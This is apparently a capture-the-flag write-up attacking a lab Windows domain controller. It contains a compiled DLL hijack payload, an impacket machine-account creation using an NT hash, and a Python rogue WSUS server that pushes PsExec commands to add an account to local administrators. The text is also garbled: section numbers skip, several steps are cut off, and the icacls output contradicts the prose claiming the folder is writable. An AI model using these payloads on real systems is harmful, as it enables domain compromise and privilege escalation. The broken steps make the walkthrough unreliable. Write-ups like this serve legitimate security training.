The LDAP banners reveal the domain and hostname, so add the DC to /etc/hosts and sync clock (Kerberos is strict about skew):

echo "<TARGET_IP> DC01.logging.htb logging.htb" | sudo tee -a /etc/hosts
sudo ntpdate <TARGET_IP>

Why not just relay or PtH? A quick check confirms it:

nxc smb <TARGET_IP> -u wallace.everette -p <initial_password>

Signing enforced, SMBv1 off — NTLM relay and MS17-010 are both dead on arrival. That rules out the "easy" lateral movement paths and confirms the intended route is through whatever wallace.everette can read.

4. Year-Rollover + Kerberos Ticket

The leaked credential was for the previous year's rotation. The service enforces a predictable yearly password rollover, so the current year's password could be derived from the same pattern:

export KRB5CCNAME=svc_recovery.ccache

7. DLL Hijack → jaylee.clifton Context (User Flag)

A monitor.ps1 script in msa_health$'s Documents folder watches a scheduled task, UpdateChecker Agent, which runs every 3 minutes as jaylee.clifton and loads a DLL from C:\ProgramData\UpdateMonitor\ if one shows up in a dropped zip. Its log confirms the behavior:

type C:\ProgramData\UpdateMonitor\Logs\monitor.log
[2026-04-20 11:11:16] Starting Sentinel Update Check...
[2026-04-20 11:11:16] Checking for update on local server...
[2026-04-20 11:11:16] No updates found locally: C:\ProgramData\UpdateMonitor\Settings_Update.zip.
[2026-04-20 11:11:16] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
[2026-04-20 11:11:16] Failed to load settings_update.dll. Error code: 126
[2026-04-20 11:11:16] Update check completed.

icacls confirms that folder is writable by any authenticated user — a straightforward DLL search-order hijack:

icacls "C:\ProgramData\UpdateMonitor"
C:\ProgramData\UpdateMonitor NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                              BUILTIN\Administrators:(I)(OI)(CI)(F)

Prepare payload on Kali:

cat > /tmp/settings_update.c << 'EOF'
#include <windows.h>
__declspec(dllexport) void PreUpdateCheck() {
    system("whoami > C:\\ProgramData\\UpdateMonitor\\jaylee_whoami.txt 2>&1");
    system("copy C:\\Users\\jaylee.clifton\\Desktop\\user.txt C:\\ProgramData\\UpdateMonitor\\user.txt >nul 2>&1");
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) { return TRUE; }
EOF

i686-w64-mingw32-gcc -shared -o /tmp/settings_update.dll /tmp/settings_update.c
zip -j /tmp/Settings_Update.zip /tmp/settings_update.dll

Deploy via WinRM:

Remove-Item "C:\ProgramData\UpdateMonitor\Settings_Update.zip" -Force -ErrorAction SilentlyContinue

Reused the same hijack, this time with a payload that downloads Rubeus and runs tgtdeleg to pull a delegable TGT for the calling user — no password needed:

11. DNS Poisoning

msa_health$ carries SeMachineAccountPrivilege, which lets it create a new machine account — and any authenticated computer account can create DNS node objects under DomainDnsZones. First create the machine account:

impacket-addcomputer -computer-name 'zhaha01$' -computer-pass '<computer_account_password>' \
  -hashes ':603fc24ee01a9409f83c9d1d701485c5' -dc-ip <TARGET_IP> 'logging.htb/msa_health$'

12. Rogue WSUS Server (wsuks)

Serve both the content port (8530) and the HTTPS WSUS port (8531), using the forged cert:

# run_wsuks.py — serve-only mode
import ssl, sys, os, logging, threading
from functools import partial
from http.server import HTTPServer

sys.modules['wsuks.lib.router'] = type(sys)('stub')
sys.modules['wsuks.lib.router'].Router = object

from wsuks.lib.logger import initLogger
initLogger(debug=False)
from wsuks.lib.wsusserver import WSUSUpdateHandler, WSUSBaseServer

HOST = '<KALI_IP>'
EXE  = './PsExec64.exe'
COMMAND = ('/accepteula /s cmd.exe /c "'
           'net localgroup administrators msa_health$ /add 2>&1 > C:\\Share\\Logs\\PWN.txt & '
           'net localgroup administrators >> C:\\Share\\Logs\\PWN.txt 2>&1 & '
           'icacls C:\\Share\\Logs\\PWN.txt /grant Everyone:F"')

exe_bytes = open(EXE, 'rb').read()
h = WSUSUpdateHandler(exe_bytes, os.path.basename(EXE), f'http://{HOST}:8530')
h.set_resources_xml(COMMAND)
log = logging.getLogger('wsuks')

def serve(port, use_tls):
    httpd = HTTPServer((HOST, port), partial(WSUSBaseServer, h))
    if use_tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain('./wsus_cert.pem', './wsus_key.pem')
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
    httpd.serve_forever()

threading.Thread(target=serve, args=(8530, False), daemon=True).start()
serve(8531, True)
python3 run_wsuks.py
[wsuks] HTTP content on <KALI_IP>:8530
[wsuks] HTTPS WSUS on <KALI_IP>:8531

The DC's built-in WSUS auto-update client trusts anything at wsus.logging.htb:8531 presenting a valid-looking cert for that name — DNS, cert, and content server are all under attacker control at this point.

Attack Chain Summary

  1. wallace.everette → Leaked svc_recovery credential (year rollover)
  2. svc_recovery → Shadow Credentials → msa_health$
  3. msa_health$ → DLL Hijack on scheduled task → jaylee.clifton context → User Flag
  4. jaylee.clifton → DNS Poison + ADCS ESC17 (UpdateSrv cert)
  5. Rogue WSUS → SYSTEM execution → Root Flag

Techniques Used:

  • Credential leak + predictable password rotation
  • Shadow Credentials on a Managed Service Account
  • DLL Hijacking via a scheduled task
  • ADCS ESC17 + WSUS MITM
  • Kerberos delegation (tgtdeleg)

Tools: smbclient, impacket, certipy-ad, Rubeus, wsuks, evil-winrm
